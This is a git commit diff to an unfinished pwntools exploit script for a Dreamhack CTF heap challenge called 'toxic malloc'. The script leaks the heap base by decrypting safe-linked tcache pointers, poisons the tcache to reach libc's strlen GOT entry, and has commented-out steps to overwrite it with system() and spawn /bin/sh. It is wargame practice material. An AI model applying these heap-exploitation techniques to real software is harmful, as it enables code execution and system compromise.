a7dab23ac5a5512aafcd4174bd94c74c253791f8
Brian <hibrian827@gmail.com>
2025-04-30 14:15:12 +0900

    still solving

--- Dreamhack/main.py
+++ Dreamhack/main.py
@@ -1,14 +1,13 @@
 from pwn import *
 
 context.log_level = 'debug'
-# context.terminal = ['tmux', 'new-window']
+context.terminal = ['tmux', 'new-window']
 
-# env={"LD_PRELOAD":"./Pwnable/toxic\\ malloc/problem/deploy/libc.so.6"}
-rem = process("./Pwnable/toxic malloc/problem/deploy/chall")
+rem = process("./Pwnable/toxic_malloc/problem/deploy/chall")
 # port = 18595
 # rem = remote("host3.dreamhack.games", port)
 
-lib = ELF("./Pwnable/toxic malloc/problem/deploy/libc.so.6")
+lib = ELF("./Pwnable/toxic_malloc/problem/deploy/libc.so.6")
 
 def safe_link(pos, ptr):
   return (pos >> 12) ^ ptr
@@ -33,12 +32,12 @@ def decrypt_safe_linking(ptr):
 def create(idx, data):
   rem.sendlineafter(b'choice:', b"1")
   rem.sendlineafter(b': ', str(idx).encode())
-  rem.sendlineafter(b': ', data)
+  rem.sendafter(b': ', data)
 
 def update(idx, data):
   rem.sendlineafter(b'choice:', b"2")
   rem.sendlineafter(b': ', str(idx).encode())
-  rem.sendlineafter(b': ', data)
+  rem.sendafter(b': ', data)
 
 def read(idx):
   rem.sendlineafter(b'choice:', b"3")
@@ -50,10 +49,16 @@ def delete(idx):
   rem.sendlineafter(b'choice:', b"4")
   rem.sendlineafter(b": ", str(idx).encode())
 
-create(0, b'A' * 7)
-create(4, b'A' * 7)
+create(0, b'A' * 8)
+create(1, b'A' * 8)
+create(4, b'A' * 8)
+
 delete(0)
-for i in range(7):
+update(0, chr(ord('B')).encode() * 16)
+delete(0)
+heap_base = decrypt_safe_linking(u64(read(0).rstrip().ljust(8, b'\x00'))) - 0x2a0
+
+for i in range(1, 7):
   update(0, chr(ord('B') + i).encode() * 16)
   delete(0)
 
@@ -62,11 +67,14 @@ strlen_got = lib_base + lib.got['strlen']
 sys_addr = lib_base + lib.symbols['system']
 print(hex(strlen_got))
 
-create(1, p64(strlen_got))
-# create(2, b"A" * 7)
+delete(1)
+update(1, b"B" * 16)
+# delete(1)
+create(1, p64(safe_link(heap_base+0x2a0, strlen_got)))
+# gdb.attach(rem)
+# create(2, b"A" * 16)
 # create(3, p64(sys_addr))
 # update(0, b"/bin/sh\x00")
 # read(0)
 
-gdb.attach(rem)
 rem.interactive()
